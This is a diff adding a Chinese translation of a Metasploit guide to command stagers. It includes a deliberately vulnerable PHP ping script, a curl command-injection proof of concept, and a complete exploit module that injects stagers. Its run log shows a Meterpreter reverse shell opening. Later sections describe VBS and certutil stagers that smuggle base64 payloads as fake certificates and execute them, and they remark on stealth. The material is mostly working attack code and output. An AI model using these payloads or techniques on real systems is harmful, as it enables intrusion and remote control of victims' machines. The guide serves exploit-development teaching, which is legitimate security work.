@@ -1,0 +1,221 @@
+命令阶段提供了一种简单的方法来编写针对典型漏洞 例如[命令执行](https://www.owasp.org/index.php/Command_Injection) 或者 [代码注入](https://www.owasp.org/index.php/Code_Injection).目前有八种不同的命令阶段,每种都使用系统命令来保存你的payload,有时会解码并执行.
+
+# 漏洞测试用例
+解释如何使用命令stager的最好方法可能是通过演示.在这里我们有一个PHP的命令注入漏洞，在企业级软件中实际上可能会看到一些愚蠢的东西。这个漏洞使得你可以在系统调用ping中注入额外的系统命令：
+```php
+<?php
+   if ( isset($_GET["ip"]) ) {
+      $output = system("ping -c 1 " . $_GET["ip"]);
+      die($output);
+   }
+?>
+
+<html>
+<body>
+  <form action = "ping.php" method = "GET">
+   IP to ping: <input type = "text" name = "ip" /> <input type = "submit" />
+  </form>
+   </body>
+</html>
+```
+将上面的php脚本(ping.php)放在[Ubuntu + Apache + PHP](https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04) 系统
+在正常的使用情况下，这是脚本的行为  它只是ping你指定的主机，并显示你的输出
+你的输出
+
+```
+$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1"
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
+rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
+```
+
+好的,接下来我们能滥用这一点来执行另一个系统命令(id)
+```
+$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id"
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+看到 这个 www-data?它是上面我们要求脚本执行的第二个命令的输出.通过这样做,我们也可以做更令人讨厌的事情  比如将一个Meterpreter负载写入目标系统,然后执行它
+# The Msf::Exploit::CmdStager Mixin
+让我们来讨论如何在上面的脚本通过命令阶段来利用它.有几个步骤你需要做
+**1.引入 Msf::Exploit::CmdStager Mixin**
+尽管有八种mixin/stagers，但在编写Metasploit漏洞时只需要引入[Msf::Exploit::CmdStager](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmdstager.rb) 这个mixin基本上是所有八个命令阶段的一个接口：
+
+```ruby
+include Msf::Exploit::CmdStager
+```
+
+**2.声明你想要的类别**
+告诉Msf::Exploit::CmdStager 你想要的类型.你能在模块元数据添加这个```CmdStagerFlavor```信息.无论是从普通级别还是目标级别。允许多种
+对一个特定目标设置类别的一个例子
+ ```ruby
+'Targets'   =>
+  [
+    [ 'Windows',
+      {
+        'Arch' => [ ARCH_X86_64, ARCH_X86 ],
+        'Platform' => 'win',
+        'CmdStagerFlavor' => [ 'certutil', 'vbs' ]
+      }
+    ]
+  ]
+```
+或者，您可以将此信息传递给execute_cmdstager方法(请从参阅调用#execute_cmdstager开始）
+
+```ruby
+execute_cmdstager(flavor: :vbs)
+```
+
+**3.创造一个 execute_command 方法**
+你必须在你的模块创造一个```def execute_command(cmd, opts = {})```方法.这就是CmdStager mixin在启动时所调用的方法.你在这个方法中的目标是把cmd变量中的所有东西都注入到漏洞代码中。 
+
+**4.开始调用#execute_cmdstager**
+最后，在你的利用方法中，调用```execute_cmdstager```开始命令阶段
+多年来，我们还了解到，在调用execute_cmdstager时，这些选项非常方便
+* **flavor** - 您可以从这里指定要使用的命令stager（flavor) 选项有: ```:bourne```, ```:debug_asm```, ```:debug_write```, ```:echo```, ```:printf```, ```:vbs```, ```:certutil```, ```:tftp```.
+* **delay** - 每个命令执行之间要延迟多少时间 0.25是默认值。
+* **linemax** -每个命令的最大字符数。2047是默认的。 
+
+**Msf::Exploit::CmdStager 模块**
+至少,这是你使用CmdStager mixin时你应该如何开始
+```ruby
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = NormalRanking
+
+  include Msf::Exploit::CmdStager
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'            => "Command Injection Using CmdStager",
+      'Description'     => %q{
+        This exploits a command injection using the command stager.
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          => [ 'sinn3r' ],
+      'References'      => [ [ 'URL', 'http://metasploit.com' ] ],
+      'Platform'        => 'linux',
+      'Targets'         => [ [ 'Linux', {} ] ],
+      'Payload'         => { 'BadChars' => "\x00" },
+      'CmdStagerFlavor' => [ 'printf' ],
+      'Privileged'      => false,
+      'DisclosureDate'  => "Jun 10 2016",
+      'DefaultTarget'   => 0))
+  end
+
+  def execute_command(cmd, opts = {})
+    # calls some method to inject cmd to the vulnerable code.
+  end
+
+  def exploit
+    print_status("Exploiting...")
+    execute_cmdstager
+  end
+
+end
+```
+正如你所看到的，我们选择了“printf”的类型作为我们的命令stager。稍后我们会对此进行更多解释，但基本上它是将我们的有效载荷写入/tmp并执行它。
+现在我们来修改execute_command方法，并根据测试用例获得代码执行。基于PoC，我们知道我们的注入字符串应该是这样的：
+```
+127.0.0.1+%26%26+[Malicious commands]
+```
+我们使用[HttpClient](https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient)在execute_command中执行操作.注意实际上有一些坏字符过滤使得exploit正确工作.这是预期的
+```ruby
+def filter_bad_chars(cmd)
+  cmd.gsub!(/chmod \+x/, 'chmod 777')
+  cmd.gsub!(/;/, ' %26%26 ')
+  cmd.gsub!(/ /, '+')
+end
+
+def execute_command(cmd, opts = {})
+  send_request_cgi({
+    'method'        => 'GET',
+    'uri'           => '/ping.php',
+    'encode_params' => false,
+    'vars_get'      => {
+      'ip' => "127.0.0.1+%26%26+#{filter_bad_chars(cmd)}"
+    }
+  })
+end
+
+def exploit
+  print_status("Exploiting...")
+  execute_cmdstager
+end
+```
+让我们运行一下 我们应该得到一个shell
+```
+msf exploit(cmdstager_demo) > run
+
+[*] Started reverse TCP handler on 10.6.0.92:4444 
+[*] Exploiting...
+[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
+[*] Sending stage (1495599 bytes) to 10.6.0.92
+[*] Meterpreter session 1 opened (10.6.0.92:4444 -> 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
+```
+
+# 类别
+我们已经知道如何使用Msf::Exploit::CmdStager mixin,让我们来看看我们能使用的命令阶段
+
+## VBS Command Stager - Windows Only
+这个 [VBS command stager](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/vbs.rb) 是在window.他会base64编码我们的payload,保存在我们的目标机器.还使用echo写入[vbs脚本](https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/cmdstager/vbs_b64) ,然后vbs脚本对Base64有效载荷进行解码并执行它。
+如果您正在利用支持Powershell的Windows，那么您可能会考虑使用[它](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit) 来代替 VBS stager，因为Powershell往往更隐蔽。
+要使用VBS stager，可以在元数据中指定CmdStagerFlavor：
+
+```ruby
+'CmdStagerFlavor' => [ 'vbs' ]
+```
+
+或者在execute_cmdstager设置:vbs
+
+```ruby
+execute_cmdstager(flavor: :vbs)
+```
+
+你还需要你的模块支持平台包括windows(也在元数据),例子
+```ruby
+'Platform' => 'win'
+```
+
+## Certutil Command Stager - Windows Only
+[Certutil](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/certutil.rb) 是一个Windows命令,可用于转储和显示证书颁发机构,配置信息，配置证书服务，备份和还原CA组件等.它只支持从window2018,2012开始的windows系统
+在certutil也可以为我们做的是从证书解码Base64字符串，并将解码的内容保存到一个文件。以下说明：
+
+```bash
+echo -----BEGIN CERTIFICATE----- > encoded.txt
+echo Just Base64 encode your binary data
+echo TVoAAA== >> encoded.txt
+echo -----END CERTIFICATE----- >> encoded.txt
+certutil -decode encoded.txt decoded.bin
+```
+为了利用这个优势，Certutil命令stager会将有效载荷保存在Base64字符串中作为假证书，请求certutil对其进行解码，最后执行它。
+
+要使用VCertutil stager，可以在元数据中指定CmdStagerFlavor：
+```ruby
+'CmdStagerFlavor' => [ 'certutil' ]
+```
+
+或者在execute_cmdstager设置:certutil
+
+```ruby
+execute_cmdstager(flavor: :certutil)
+```
+
+你还需要你的模块支持平台包括windows(也在元数据),例子
+```ruby
+'Platform' => 'win'
+```
+
+
